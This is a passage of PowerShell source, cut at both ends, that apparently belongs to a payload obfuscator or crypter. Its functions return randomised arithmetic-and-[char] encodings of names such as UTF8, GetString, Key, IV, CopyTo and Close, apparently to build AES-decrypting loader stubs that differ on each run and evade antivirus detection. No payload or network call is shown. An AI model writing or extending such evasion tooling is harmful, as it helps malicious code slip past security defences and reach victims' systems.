        '([char](((2564 -Band 4421) + (2564 -Bor 4421) + 1093 - 7962))+[char](((-12835 -Band 1979) + (-12835 -Bor 1979) + 4317 + 6650))+[char](((-6061 -Band 2244) + (-6061 -Bor 2244) - 3138 + 7022))+[char](((-1780 -Band 7541) + (-1780 -Bor 7541) - 4739 - 950))+[char]((17488 - 2414 - 8302 - 6707))+[char]((-6566 - 2658 + 954 + 8352))+[char](((-1961 -Band 9022) + (-1961 -Bor 9022) - 3954 - 3042))+[char](((-13346 -Band 1957) + (-13346 -Bor 1957) + 9863 + 1608))+[char](((-13521 -Band 6215) + (-13521 -Bor 6215) + 5081 + 2307))+[char]((-1901 - 9591 + 5700 + 5857))+[char](((-11222 -Band 4785) + (-11222 -Bor 4785) + 6758 - 232)))') | Get-Random
    $nvtocharobf = $nvtoarray | Get-Random
    return $nvtocharobf
}

function utfobf {
    $nvutf = @(
            '([char](((-5586 -Band 7430) + (-5586 -Bor 7430) - 4751 + 2992))+[char]((1766 - 9323 + 5324 + 2317))+[char](((-1619 -Band 2076) + (-1619 -Bor 2076) + 4623 - 5010))+[char]((10130 - 7087 - 9614 + 6627)))',
            '([char]((23234 - 8023 - 5217 - 9909))+[char]((5779 - 929 + 248 - 4982))+[char]((-20 - 1618 + 1982 - 242))+[char](((-15510 -Band 2327) + (-15510 -Bor 2327) + 9951 + 3288)))',
            '([char](((2066 -Band 1) + (2066 -Bor 1) - 3698 + 1748))+[char](((-5985 -Band 9080) + (-5985 -Bor 9080) - 6351 + 3340))+[char](((1403 -Band 9626) + (1403 -Bor 9626) - 1074 - 9885))+[char](((-795 -Band 6124) + (-795 -Bor 6124) - 2574 - 2699)))',
            '([char](((-2783 -Band 1853) + (-2783 -Bor 1853) + 4220 - 3173))+[char](((-13677 -Band 4705) + (-13677 -Bor 4705) + 5231 + 3857))+[char]((14397 - 5189 - 327 - 8811))+[char](((-15724 -Band 5356) + (-15724 -Bor 5356) + 8396 + 2028)))',
            '([char](((1733 -Band 3681) + (1733 -Bor 3681) + 74 - 5371))+[char]((5055 - 9151 + 8890 - 4678))+[char]((2914 - 1930 - 1935 + 1053))+[char](((2930 -Band 4822) + (2930 -Bor 4822) - 5582 - 2114)))',
            '([char]((13284 - 7938 + 1738 - 6967))+[char]((-5689 - 4438 + 5703 + 4508))+[char](((-10348 -Band 5617) + (-10348 -Bor 5617) + 4156 + 677))+[char](((-13081 -Band 2727) + (-13081 -Bor 2727) + 2662 + 7748)))',
            '([char](((-2677 -Band 2906) + (-2677 -Bor 2906) + 1591 - 1735))+[char](((4904 -Band 4562) + (4904 -Bor 4562) - 1003 - 8379))+[char](((1614 -Band 9389) + (1614 -Bor 9389) - 9428 - 1473))+[char](((-7893 -Band 4973) + (-7893 -Bor 4973) + 632 + 2344)))',
            '([char](((-15212 -Band 4405) + (-15212 -Bor 4405) + 3213 + 7679))+[char](((-1237 -Band 5295) + (-1237 -Bor 5295) - 8168 + 4226))+[char](((3833 -Band 616) + (3833 -Bor 616) + 1393 - 5772))+[char](((-1442 -Band 9351) + (-1442 -Bor 9351) - 9352 + 1499)))',
            '([char]((16641 - 4215 - 4328 - 7981))+[char]((-4094 - 7633 + 3316 + 8495))+[char](((6731 -Band 3635) + (6731 -Bor 3635) - 603 - 9693))+[char](((-4029 -Band 1974) + (-4029 -Bor 1974) + 2936 - 825)))',
            '([char]((9161 - 8165 + 3327 - 4238))+[char]((9727 - 8632 - 3274 + 2263))+[char](((-7700 -Band 8327) + (-7700 -Bor 8327) + 2812 - 3337))+[char]((-3341 - 1544 - 4212 + 9153)))',
            '([char](((-8390 -Band 3333) + (-8390 -Bor 3333) + 7779 - 2637))+[char](((-15831 -Band 6457) + (-15831 -Bor 6457) + 6464 + 2994))+[char](((-13505 -Band 1281) + (-13505 -Bor 1281) + 4740 + 7586))+[char]((-4852 - 7254 + 8423 + 3739)))',
            '([char]((4601 - 6672 + 1003 + 1185))+[char]((12030 - 2435 - 2269 - 7242))+[char](((565 -Band 8374) + (565 -Bor 8374) - 9868 + 1031))+[char](((-18203 -Band 1438) + (-18203 -Bor 1438) + 8632 + 8189)))',
            '([char]((-1150 - 8382 + 7902 + 1747))+[char](((-13825 -Band 3648) + (-13825 -Bor 3648) + 7008 + 3285))+[char]((16132 - 5386 - 7819 - 2825))+[char]((5854 - 3012 + 3141 - 5927)))',
            '([char](((-720 -Band 5247) + (-720 -Bor 5247) - 4448 + 6))+[char](((-20053 -Band 6694) + (-20053 -Bor 6694) + 5369 + 8106))+[char](((-9554 -Band 4520) + (-9554 -Bor 4520) + 9732 - 4628))+[char]((17924 - 9669 - 8172 - 27)))',
            '([char]((15522 - 2492 - 8340 - 4573))+[char](((3904 -Band 1925) + (3904 -Bor 1925) - 2021 - 3724))+[char]((10442 - 9321 - 6218 + 5199))+[char](((-5005 -Band 9733) + (-5005 -Bor 9733) - 8666 + 3994)))',
            '([char](((309 -Band 840) + (309 -Bor 840) + 4096 - 5160))+[char](((2384 -Band 615) + (2384 -Bor 615) - 8335 + 5452))+[char]((2373 - 3477 + 2317 - 1111))+[char](((6943 -Band 651) + (6943 -Bor 651) - 4428 - 3110)))')
    $nvutfobf = $nvutf | Get-Random
    return $nvutfobf
}

function getstringobf {
    $nvgetstring = @(
            '([char](((-18196 -Band 8268) + (-18196 -Bor 8268) + 7916 + 2083))+[char](((-13718 -Band 5844) + (-13718 -Bor 5844) - 2014 + 9957))+[char](((-6448 -Band 4665) + (-6448 -Bor 4665) + 2451 - 584))+[char]((2891 - 2651 + 7284 - 7441))+[char]((13751 - 338 - 3460 - 9869))+[char]((9337 - 3069 - 2364 - 3822))+[char]((1752 - 6806 - 1851 + 6978))+[char](((-3691 -Band 294) + (-3691 -Bor 294) - 1601 + 5076))+[char]((-4843 - 5109 + 4557 + 5466)))',
            '([char]((9181 - 2509 + 918 - 7519))+[char](((-702 -Band 2858) + (-702 -Bor 2858) + 2919 - 4974))+[char](((-21795 -Band 8310) + (-21795 -Bor 8310) + 9574 + 3995))+[char](((-1936 -Band 4661) + (-1936 -Bor 4661) + 742 - 3384))+[char]((8934 - 2555 - 9508 + 3213))+[char]((-7045 - 6821 + 6818 + 7130))+[char]((3265 - 5518 + 82 + 2244))+[char]((6509 - 6251 - 80 - 100))+[char]((3831 - 6791 + 4587 - 1556)))',
            '([char]((5425 - 8686 + 6081 - 2749))+[char]((3743 - 6476 + 5358 - 2556))+[char]((-4655 - 4290 + 43 + 8986))+[char](((-7931 -Band 9418) + (-7931 -Bor 9418) - 4136 + 2732))+[char]((12288 - 6727 - 1371 - 4106))+[char](((-1757 -Band 6717) + (-1757 -Bor 6717) - 2235 - 2611))+[char](((7984 -Band 4264) + (7984 -Bor 4264) - 3975 - 8200))+[char]((-2327 - 8361 + 6269 + 4497))+[char]((16995 - 6335 - 3618 - 6971)))',
            '([char](((16311 -Band 2261) + (16311 -Bor 2261) - 9979 - 8522))+[char](((4619 -Band 6694) + (4619 -Bor 6694) - 2594 - 8650))+[char](((1713 -Band 2359) + (1713 -Bor 2359) + 804 - 4792))+[char](((-3742 -Band 9527) + (-3742 -Bor 9527) - 9841 + 4139))+[char](((-5461 -Band 8782) + (-5461 -Bor 8782) - 2688 - 549))+[char]((14024 - 4577 - 9260 - 73))+[char]((27404 - 7633 - 9783 - 9883))+[char](((12251 -Band 2532) + (12251 -Bor 2532) - 7309 - 7396))+[char]((8711 - 6401 + 4049 - 6288)))',
            '([char](((6530 -Band 4345) + (6530 -Bor 4345) - 1834 - 8970))+[char]((-1724 - 2349 + 1483 + 2659))+[char]((9503 - 1626 - 9739 + 1946))+[char](((-355 -Band 4103) + (-355 -Bor 4103) - 8696 + 5031))+[char]((-5960 - 2565 + 5492 + 3117))+[char]((7567 - 4784 + 7231 - 9900))+[char](((-9582 -Band 9640) + (-9582 -Bor 9640) - 2769 + 2816))+[char]((14459 - 9016 + 3188 - 8521))+[char](((-3928 -Band 7833) + (-3928 -Bor 7833) + 675 - 4509)))',
            '([char]((7496 - 9865 - 1025 + 3465))+[char](((-5248 -Band 2586) + (-5248 -Bor 2586) + 4274 - 1543))+[char](((-7758 -Band 4552) + (-7758 -Bor 4552) + 9160 - 5870))+[char]((4919 - 2358 - 3826 + 1348))+[char]((18056 - 9412 - 4130 - 4430))+[char]((14787 - 8666 - 8886 + 2879))+[char](((-2668 -Band 2910) + (-2668 -Bor 2910) - 2027 + 1858))+[char](((-807 -Band 4925) + (-807 -Bor 4925) - 3232 - 808))+[char]((-8943 - 5945 + 9127 + 5832)))',
            '([char]((413 - 5173 + 9787 - 4956))+[char]((2966 - 5769 - 2354 + 5258))+[char](((-253 -Band 3078) + (-253 -Bor 3078) - 5590 + 2849))+[char](((-4718 -Band 5106) + (-4718 -Bor 5106) - 7207 + 6902))+[char](((-9429 -Band 8055) + (-9429 -Bor 8055) - 3523 + 5013))+[char]((20246 - 7741 - 8005 - 4386))+[char]((-2115 - 3385 + 5103 + 470))+[char](((-10948 -Band 4189) + (-10948 -Bor 4189) + 9628 - 2759))+[char](((-8916 -Band 3774) + (-8916 -Bor 3774) + 1367 + 3846)))',
            '([char]((10048 - 9760 + 3402 - 3587))+[char]((-2483 - 2115 + 7680 - 3013))+[char]((-7171 - 219 + 837 + 6637))+[char](((-18884 -Band 7234) + (-18884 -Bor 7234) + 6868 + 4865))+[char](((-14644 -Band 4879) + (-14644 -Bor 4879) + 1070 + 8779))+[char](((2186 -Band 5573) + (2186 -Bor 5573) - 7651 - 26))+[char](((-8158 -Band 3397) + (-8158 -Bor 3397) + 7678 - 2844))+[char]((-2212 - 2499 + 4104 + 685))+[char]((13114 - 5878 - 2891 - 4274)))',
            '([char]((4784 - 4437 - 7376 + 7132))+[char]((13339 - 7701 - 3539 - 2030))+[char]((7908 - 4533 - 9740 + 6481))+[char]((9214 - 3400 + 3497 - 9228))+[char]((11375 - 7610 + 5979 - 9660))+[char]((-7977 - 2376 + 1709 + 8726))+[char]((4998 - 5472 + 7429 - 6882))+[char]((6606 - 8998 + 5054 - 2584))+[char]((-6084 - 2527 - 843 + 9525)))',
            '([char]((-9518 - 1253 + 8920 + 1954))+[char]((-3296 - 2395 - 218 + 5978))+[char]((155 - 3345 + 1659 + 1647))+[char]((14128 - 4787 - 5652 - 3606))+[char]((-11955 - 7498 + 9620 + 9949))+[char]((1262 - 191 - 6882 + 5893))+[char]((21833 - 5744 - 8413 - 7603))+[char](((10749 -Band 7939) + (10749 -Bor 7939) - 8703 - 9907))+[char](((-2226 -Band 5472) + (-2226 -Bor 5472) + 4476 - 7651)))',
            '([char](((-3878 -Band 2520) + (-3878 -Bor 2520) + 9868 - 8407))+[char](((-2628 -Band 6326) + (-2628 -Bor 6326) - 8360 + 4731))+[char](((-5516 -Band 5422) + (-5516 -Bor 5422) - 6534 + 6744))+[char]((12068 - 7701 + 3637 - 7921))+[char](((-20006 -Band 4076) + (-20006 -Bor 4076) + 8092 + 7922))+[char]((6873 - 4035 + 4340 - 7064))+[char](((-14596 -Band 8957) + (-14596 -Bor 8957) + 8700 - 2988))+[char]((-9342 - 5804 + 6908 + 8316))+[char](((-23644 -Band 9687) + (-23644 -Bor 9687) + 8902 + 5126)))',
            '([char]((10616 - 6794 - 3970 + 251))+[char]((5251 - 5083 + 9426 - 9525))+[char]((-6667 - 6801 + 3902 + 9682))+[char]((10612 - 7520 - 2585 - 424))+[char]((6350 - 4669 + 7647 - 9212))+[char]((10167 - 8960 - 5386 + 4261))+[char]((16722 - 8879 - 549 - 7221))+[char]((-5243 - 7566 + 3608 + 9311))+[char](((-13287 -Band 210) + (-13287 -Bor 210) + 4253 + 8895)))',
            '([char]((6008 - 495 - 4900 - 542))+[char]((666 - 1739 + 8814 - 7640))+[char]((15935 - 9843 - 6981 + 1005))+[char](((15661 -Band 186) + (15661 -Bor 186) - 8444 - 7320))+[char](((-18059 -Band 8003) + (-18059 -Bor 8003) + 9314 + 826))+[char]((6636 - 5361 - 6281 + 5088))+[char](((-755 -Band 2182) + (-755 -Bor 2182) + 4594 - 5948))+[char]((-1597 - 1613 - 6636 + 9924))+[char]((4353 - 9628 + 154 + 5192)))',
            '([char]((2495 - 2514 + 1847 - 1757))+[char](((4882 -Band 4848) + (4882 -Bor 4848) - 9022 - 639))+[char](((12114 -Band 4182) + (12114 -Bor 4182) - 9846 - 6366))+[char]((13330 - 7319 + 301 - 6229))+[char]((-6026 - 847 + 7881 - 924))+[char](((-10663 -Band 2446) + (-10663 -Bor 2446) + 1458 + 6841))+[char](((-17478 -Band 7101) + (-17478 -Bor 7101) + 1430 + 9020))+[char]((13124 - 6987 - 1447 - 4612))+[char](((6700 -Band 8160) + (6700 -Bor 8160) - 5437 - 9352)))',
            '([char]((11397 - 4496 - 4373 - 2457))+[char](((7612 -Band 5119) + (7612 -Bor 5119) - 7631 - 5031))+[char]((25289 - 9383 - 6669 - 9153))+[char]((8183 - 7970 + 6 - 136))+[char]((8265 - 5531 - 7787 + 5169))+[char]((-6496 - 838 + 8281 - 833))+[char](((6300 -Band 5094) + (6300 -Bor 5094) - 6288 - 5001))+[char]((3881 - 8047 - 331 + 4575))+[char]((7860 - 7479 - 4005 + 3695)))',
            '([char](((7110 -Band 7192) + (7110 -Bor 7192) - 5727 - 8472))+[char]((10706 - 9987 + 8213 - 8863))+[char](((-4315 -Band 7498) + (-4315 -Bor 7498) - 6202 + 3135))+[char]((6133 - 5229 + 1745 - 2534))+[char](((-3163 -Band 6736) + (-3163 -Bor 6736) - 4042 + 585))+[char](((-16888 -Band 8584) + (-16888 -Bor 8584) + 3277 + 5109))+[char](((9080 -Band 2927) + (9080 -Bor 2927) - 4791 - 7143))+[char](((15613 -Band 684) + (15613 -Bor 684) - 8868 - 7319))+[char](((6411 -Band 2324) + (6411 -Bor 2324) - 9338 + 674)))')
    $getstringobf = $nvgetstring | Get-Random
    return $getstringobf
}

function obfcreate {
    $nvcreate = @(
        '([char](((-3163 -Band 1640) + (-3163 -Bor 1640) - 2810 + 4400))+[char]((3246 - 8505 + 3151 + 2190))+[char](((11207 -Band 1774) + (11207 -Bor 1774) - 4342 - 8570))+[char]((975 - 986 - 2012 + 2088))+[char]((4040 - 9478 + 4002 + 1520))+[char](((2975 -Band 2094) + (2975 -Bor 2094) - 8997 + 3997)))',
        '([char](((4357 -Band 2053) + (4357 -Bor 2053) - 4916 - 1427))+[char]((1568 - 9051 + 9026 - 1429))+[char](((2860 -Band 1838) + (2860 -Bor 1838) - 5602 + 1005))+[char]((8340 - 6056 + 6860 - 9047))+[char]((-14702 - 2356 + 9412 + 7762))+[char](((-15418 -Band 7117) + (-15418 -Bor 7117) + 9869 - 1467)))',
        '([char](((-10093 -Band 8876) + (-10093 -Bor 8876) + 5894 - 4578))+[char]((6282 - 5019 + 5194 - 6375))+[char]((3392 - 1777 - 8486 + 6940))+[char]((-4929 - 276 + 5876 - 606))+[char](((-17416 -Band 7710) + (-17416 -Bor 7710) + 6412 + 3378))+[char]((7372 - 7366 + 6287 - 6224)))',
        '([char]((7912 - 8245 + 4537 - 4137))+[char](((10443 -Band 2616) + (10443 -Bor 2616) - 7537 - 5408))+[char]((905 - 6916 + 6307 - 227))+[char](((-25486 -Band 7985) + (-25486 -Bor 7985) + 8249 + 9349))+[char](((14013 -Band 1950) + (14013 -Bor 1950) - 8255 - 7624))+[char](((-5316 -Band 4653) + (-5316 -Bor 4653) + 7261 - 6497)))',
        '([char]((-4194 - 8641 + 5398 + 7536))+[char](((-22771 -Band 8276) + (-22771 -Bor 8276) + 6196 + 8381))+[char]((1421 - 8944 + 2405 + 5219))+[char](((2120 -Band 2909) + (2120 -Bor 2909) - 8366 + 3402))+[char]((4624 - 6515 + 322 + 1685))+[char]((-2534 - 2108 + 5617 - 906)))',
        '([char]((4775 - 1109 + 1995 - 5594))+[char]((14512 - 6759 - 6038 - 1633))+[char]((7103 - 5197 - 3679 + 1842))+[char]((-8182 - 7438 + 9459 + 6258))+[char]((-1383 - 8872 + 2246 + 8125))+[char](((-6015 -Band 8178) + (-6015 -Bor 8178) - 2929 + 867)))',
        '([char]((11358 - 5349 - 8510 + 2568))+[char]((1390 - 1094 + 5553 - 5735))+[char]((-1416 - 6962 + 6036 + 2443))+[char](((-1356 -Band 8810) + (-1356 -Bor 8810) - 3713 - 3676))+[char](((-4805 -Band 931) + (-4805 -Bor 931) + 8332 - 4374))+[char](((2868 -Band 1914) + (2868 -Bor 1914) - 5448 + 735)))',
        '([char](((-15725 -Band 1776) + (-15725 -Bor 1776) + 4177 + 9871))+[char]((3040 - 1287 - 9082 + 7443))+[char](((-4361 -Band 8524) + (-4361 -Bor 8524) - 1010 - 3052))+[char]((11286 - 4535 - 4912 - 1774))+[char]((15676 - 5393 - 3060 - 7139))+[char]((7215 - 2129 + 2462 - 7479)))',
        '([char](((-19524 -Band 7855) + (-19524 -Bor 7855) + 7071 + 4665))+[char]((-678 - 5052 + 7057 - 1213))+[char](((-11198 -Band 5727) + (-11198 -Bor 5727) - 3500 + 9072))+[char]((13188 - 3389 - 9148 - 586))+[char]((4124 - 4216 + 9162 - 8986))+[char]((6933 - 6656 + 1433 - 1641)))',
        '([char](((-12295 -Band 6418) + (-12295 -Bor 6418) + 7961 - 1985))+[char](((9701 -Band 7409) + (9701 -Bor 7409) - 9962 - 7034))+[char]((-5193 - 1249 - 2815 + 9358))+[char]((1391 - 1432 + 9157 - 9019))+[char]((7915 - 4955 - 4045 + 1169))+[char](((-1816 -Band 3915) + (-1816 -Bor 3915) - 961 - 1037)))',
        '([char](((5773 -Band 5926) + (5773 -Bor 5926) - 6914 - 4718))+[char]((953 - 3718 - 1495 + 4342))+[char]((-4728 - 2683 + 4570 + 2910))+[char]((-14875 - 906 + 9122 + 6756))+[char](((9121 -Band 2946) + (9121 -Bor 2946) - 7071 - 4912))+[char](((-14805 -Band 8195) + (-14805 -Bor 8195) - 198 + 6877)))',
        '([char]((14467 - 7036 + 752 - 8084))+[char]((7950 - 4944 - 2831 - 61))+[char](((3537 -Band 1072) + (3537 -Bor 1072) + 3816 - 8324))+[char]((16962 - 4982 - 8401 - 3482))+[char]((5960 - 6290 + 7281 - 6867))+[char]((-11908 - 4484 + 8315 + 8146)))',
        '([char]((7030 - 6585 - 3381 + 3003))+[char]((4261 - 1150 - 8793 + 5796))+[char]((14137 - 2528 - 5496 - 6012))+[char]((11116 - 9489 - 5311 + 3749))+[char]((3906 - 6281 + 4394 - 1903))+[char](((-13549 -Band 6766) + (-13549 -Bor 6766) + 1162 + 5690)))',
        '([char]((1162 - 2430 + 2808 - 1441))+[char](((-9072 -Band 1761) + (-9072 -Bor 1761) + 6716 + 709))+[char](((-4451 -Band 2315) + (-4451 -Bor 2315) - 3837 + 6042))+[char](((-22767 -Band 9112) + (-22767 -Bor 9112) + 8747 + 4973))+[char]((6119 - 8546 - 158 + 2669))+[char](((-10498 -Band 9968) + (-10498 -Bor 9968) + 3519 - 2920)))',
        '([char]((8848 - 3646 + 3584 - 8719))+[char]((7750 - 9891 + 3561 - 1338))+[char](((5155 -Band 483) + (5155 -Bor 483) - 5867 + 298))+[char]((23987 - 5903 - 9172 - 8847))+[char](((-9847 -Band 1452) + (-9847 -Bor 1452) + 644 + 7835))+[char]((5112 - 9229 - 4701 + 8887)))',
        '([char](((2324 -Band 1258) + (2324 -Bor 1258) - 4666 + 1183))+[char](((-21510 -Band 9818) + (-21510 -Bor 9818) + 3330 + 8444))+[char](((6413 -Band 5882) + (6413 -Bor 5882) - 2477 - 9717))+[char]((-11983 - 2663 + 6777 + 7934))+[char](((-15393 -Band 9199) + (-15393 -Bor 9199) - 3231 + 9541))+[char]((14 - 934 + 8909 - 7920)))')
    $createobf = $nvcreate | Get-Random
    return $createobf
}

function keyobf {
    $nvkey = @(
        '([char](((-7355 -Band 4778) + (-7355 -Bor 4778) + 4242 - 1590))+[char]((9641 - 7533 - 3188 + 1149))+[char]((1144 - 8915 + 7737 + 123)))',
        '([char]((7382 - 3632 - 5219 + 1544))+[char]((-9109 - 6033 + 9228 + 6015))+[char]((3503 - 1981 - 8165 + 6764)))',
        '([char](((-1327 -Band 863) + (-1327 -Bor 863) - 3894 + 4465))+[char]((-13132 - 2641 + 7815 + 8027))+[char](((-5052 -Band 6859) + (-5052 -Bor 6859) + 6064 - 7782)))',
        '([char](((-16976 -Band 2150) + (-16976 -Bor 2150) + 9066 + 5835))+[char](((-8843 -Band 4875) + (-8843 -Bor 4875) + 6032 - 1963))+[char](((-2752 -Band 4185) + (-2752 -Bor 4185) + 4243 - 5587)))',
        '([char]((8177 - 4878 - 998 - 2194))+[char](((-4830 -Band 1278) + (-4830 -Bor 1278) - 3280 + 6901))+[char]((7817 - 8205 - 3531 + 4040)))',
        '([char](((-17121 -Band 2873) + (-17121 -Bor 2873) + 9714 + 4641))+[char](((-5052 -Band 5558) + (-5052 -Bor 5558) + 5161 - 5566))+[char](((5068 -Band 7970) + (5068 -Bor 7970) - 6369 - 6580)))',
        '([char](((-461 -Band 7046) + (-461 -Bor 7046) - 1546 - 4932))+[char]((-11863 - 7376 + 9841 + 9499))+[char]((7073 - 4002 - 2825 - 125)))',
        '([char]((17129 - 8213 - 5305 - 3536))+[char](((2652 -Band 9010) + (2652 -Bor 9010) - 7893 - 3700))+[char]((2796 - 7174 + 5468 - 969)))')
    $keyobf = $nvkey | Get-Random
    return $keyobf
}

function keysizeobf {
    $nvkeysize = @(
        '([char](((-5487 -Band 1479) + (-5487 -Bor 1479) + 7554 - 3471))+[char]((10736 - 8854 + 7573 - 9386))+[char](((-10138 -Band 4710) + (-10138 -Bor 4710) + 6689 - 1172))+[char](((9286 -Band 975) + (9286 -Bor 975) - 4123 - 6055))+[char]((14750 - 5374 - 471 - 8832))+[char](((-7490 -Band 5446) + (-7490 -Bor 5446) + 1682 + 452))+[char]((-8699 - 5591 + 9844 + 4515)))',
        '([char]((25626 - 6699 - 9873 - 8979))+[char]((17754 - 6703 - 8611 - 2339))+[char]((-2606 - 2524 + 1155 + 4096))+[char](((-2861 -Band 7414) + (-2861 -Bor 7414) - 9665 + 5195))+[char]((13550 - 9660 + 4006 - 7791))+[char](((-3616 -Band 5510) + (-3616 -Bor 5510) + 7543 - 9315))+[char]((10634 - 4171 - 5094 - 1268)))',
        '([char](((7069 -Band 3092) + (7069 -Bor 3092) - 660 - 9394))+[char]((6399 - 2601 - 9853 + 6124))+[char]((20984 - 8844 - 6591 - 5460))+[char]((-10135 - 6883 + 9261 + 7840))+[char](((-15860 -Band 8478) + (-15860 -Bor 8478) + 6875 + 580))+[char](((-1160 -Band 7274) + (-1160 -Bor 7274) - 1951 - 4073))+[char](((3670 -Band 1058) + (3670 -Bor 1058) - 3915 - 744)))',
        '([char](((-11449 -Band 6797) + (-11449 -Bor 6797) - 1238 + 5965))+[char](((-6474 -Band 421) + (-6474 -Bor 421) + 7341 - 1187))+[char](((-3834 -Band 5643) + (-3834 -Bor 5643) + 6932 - 8652))+[char]((14085 - 2437 - 8181 - 3384))+[char](((-8649 -Band 4370) + (-8649 -Bor 4370) + 3565 + 819))+[char]((15632 - 7450 - 7995 - 97))+[char](((5455 -Band 8469) + (5455 -Bor 8469) - 3902 - 9921)))',
        '([char](((-15855 -Band 7129) + (-15855 -Bor 7129) + 665 + 8168))+[char]((7420 - 9194 + 4886 - 3043))+[char](((9648 -Band 7260) + (9648 -Bor 7260) - 8299 - 8488))+[char](((-10634 -Band 7971) + (-10634 -Bor 7971) - 81 + 2827))+[char](((-23366 -Band 5676) + (-23366 -Bor 5676) + 8156 + 9639))+[char](((-5964 -Band 1433) + (-5964 -Bor 1433) + 6512 - 1891))+[char]((9555 - 7396 + 7570 - 9628)))',
        '([char]((21191 - 4267 - 9239 - 7578))+[char]((14010 - 8692 - 7679 + 2462))+[char]((-12358 - 682 + 6259 + 6870))+[char]((-6220 - 3639 + 2975 + 6967))+[char]((8645 - 3986 + 1625 - 6179))+[char](((-350 -Band 477) + (-350 -Bor 477) - 8451 + 8414))+[char](((-5705 -Band 5190) + (-5705 -Bor 5190) - 8403 + 9019)))',
        '([char]((-460 - 338 - 5277 + 6182))+[char](((-8307 -Band 9539) + (-8307 -Bor 9539) + 1552 - 2683))+[char](((5623 -Band 1188) + (5623 -Bor 1188) + 3157 - 9847))+[char]((451 - 9071 + 1073 + 7662))+[char]((-8764 - 2227 + 3097 + 7967))+[char]((-12617 - 6822 + 9624 + 9937))+[char](((-5850 -Band 9544) + (-5850 -Bor 9544) - 6632 + 3039)))',
        '([char]((13313 - 9605 - 8551 + 4918))+[char]((-4211 - 5129 + 5896 + 3513))+[char]((19423 - 3792 - 8025 - 7485))+[char](((-6064 -Band 8132) + (-6064 -Bor 8132) - 3398 + 1413))+[char](((-12517 -Band 6452) + (-12517 -Bor 6452) + 8578 - 2408))+[char](((-7169 -Band 6176) + (-7169 -Bor 6176) + 8011 - 6896))+[char](((7710 -Band 1994) + (7710 -Bor 1994) - 1292 - 8311)))')
    $keysizeobf = $nvkeysize | Get-Random
    return $keysizeobf
}

function ivobf {
    $nviv = @(
        '([char](((-10056 -Band 8804) + (-10056 -Bor 8804) + 8813 - 7488))+[char](((-892 -Band 742) + (-892 -Bor 742) - 1709 + 1945)))',
        '([char](((-7351 -Band 8551) + (-7351 -Bor 8551) + 1896 - 3023))+[char](((-1179 -Band 3146) + (-1179 -Bor 3146) + 6655 - 8504)))',
        '([char]((-1970 - 4512 + 4087 + 2500))+[char]((12720 - 5287 - 17 - 7330)))',
        '([char]((-6352 - 1513 + 1739 + 6231))+[char](((-17305 -Band 6482) + (-17305 -Bor 6482) + 5213 + 5728)))')
    $ivobf = $nviv | Get-Random
    return $ivobf
}

function copytoobf {
    $nvcopyto = @(
        '([char](((9454 -Band 984) + (9454 -Bor 984) - 1369 - 9002))+[char](((-4158 -Band 6370) + (-4158 -Bor 6370) + 5618 - 7751))+[char]((15516 - 2322 - 7216 - 5898))+[char]((-2208 - 2561 + 2747 + 2111))+[char](((-2157 -Band 5249) + (-2157 -Bor 5249) - 8338 + 5330))+[char]((5259 - 6882 - 4515 + 6217)))',
        '([char]((-6294 - 9680 + 8754 + 7287))+[char]((9364 - 8940 + 9598 - 9911))+[char](((10459 -Band 911) + (10459 -Bor 911) - 6281 - 4977))+[char]((4058 - 7610 - 3895 + 7568))+[char](((4548 -Band 1652) + (4548 -Bor 1652) + 39 - 6155))+[char]((12198 - 8136 - 7009 + 3058)))',
        '([char](((-2683 -Band 1089) + (-2683 -Bor 1089) + 3788 - 2095))+[char](((-13869 -Band 5252) + (-13869 -Bor 5252) + 2151 + 6545))+[char](((7095 -Band 2688) + (7095 -Bor 2688) - 76 - 9627))+[char](((-4015 -Band 9251) + (-4015 -Bor 9251) - 6707 + 1560))+[char]((-5360 - 3176 - 910 + 9530))+[char](((-11109 -Band 6945) + (-11109 -Bor 6945) + 4114 + 129)))',
        '([char](((-5310 -Band 2554) + (-5310 -Bor 2554) + 1118 + 1705))+[char]((-5154 - 9004 + 4332 + 9937))+[char](((-4353 -Band 6211) + (-4353 -Bor 6211) + 7194 - 8972))+[char](((-513 -Band 9400) + (-513 -Bor 9400) - 1856 - 6910))+[char](((5623 -Band 4080) + (5623 -Bor 4080) - 3473 - 6146))+[char](((6762 -Band 7356) + (6762 -Bor 7356) - 9412 - 4595)))',
        '([char](((-17418 -Band 8898) + (-17418 -Bor 8898) + 3101 + 5518))+[char](((-7909 -Band 6700) + (-7909 -Bor 6700) - 2825 + 4145))+[char]((3027 - 8878 + 2904 + 3027))+[char](((4069 -Band 1514) + (4069 -Bor 1514) + 4213 - 9707))+[char]((11985 - 7110 + 1419 - 6210))+[char]((19209 - 3546 - 7667 - 7917)))',
        '([char](((11085 -Band 5492) + (11085 -Bor 5492) - 7939 - 8539))+[char]((2849 - 6016 - 382 + 3660))+[char]((4810 - 2190 - 4199 + 1659))+[char]((-9607 - 6288 + 9022 + 6994))+[char](((2130 -Band 7130) + (2130 -Bor 7130) - 7091 - 2085))+[char]((-10054 - 4267 + 4787 + 9645)))',
        '([char](((-10693 -Band 4418) + (-10693 -Bor 4418) + 6209 + 165))+[char](((4522 -Band 2889) + (4522 -Bor 2889) - 6898 - 434))+[char]((4397 - 837 + 123 - 3571))+[char](((10522 -Band 1777) + (10522 -Bor 1777) - 7188 - 5022))+[char]((-8634 - 3660 + 6182 + 6228))+[char]((14556 - 5112 - 7237 - 2128)))',
        '([char](((3229 -Band 170) + (3229 -Bor 170) - 7360 + 4060))+[char]((2017 - 8819 + 4597 + 2316))+[char]((1740 - 8790 + 675 + 6487))+[char]((10751 - 2955 + 1942 - 9617))+[char](((-3920 -Band 2555) + (-3920 -Bor 2555) - 1645 + 3126))+[char]((5341 - 3432 + 5504 - 7302)))')
    $copytoobf = $nvcopyto | Get-Random
    return $copytoobf
}

function closeobf {
    $nvclose = @(
        '([char](((-12020 -Band 7533) + (-12020 -Bor 7533) + 4759 - 205))+[char]((-4029 - 4128 - 1584 + 9817))+[char]((-4014 - 308 + 3481 + 920))+[char]((10724 - 5375 - 2596 - 2670))+[char](((-32 -Band 482) + (-32 -Bor 482) + 4030 - 4411)))',
        '([char](((-24606 -Band 7822) + (-24606 -Bor 7822) + 8365 + 8486))+[char]((-172 - 4141 - 5529 + 9950))+[char](((-12390 -Band 5553) + (-12390 -Bor 5553) + 7008 - 60))+[char]((6473 - 689 + 2641 - 8310))+[char]((3070 - 1801 - 8832 + 7664)))',
        '([char]((23746 - 8506 - 9883 - 5258))+[char](((-17789 -Band 7973) + (-17789 -Bor 7973) + 4496 + 5396))+[char]((-1411 - 5631 + 1749 + 5372))+[char]((7083 - 1940 + 4586 - 9646))+[char](((-10248 -Band 4665) + (-10248 -Bor 4665) - 830 + 6482)))',
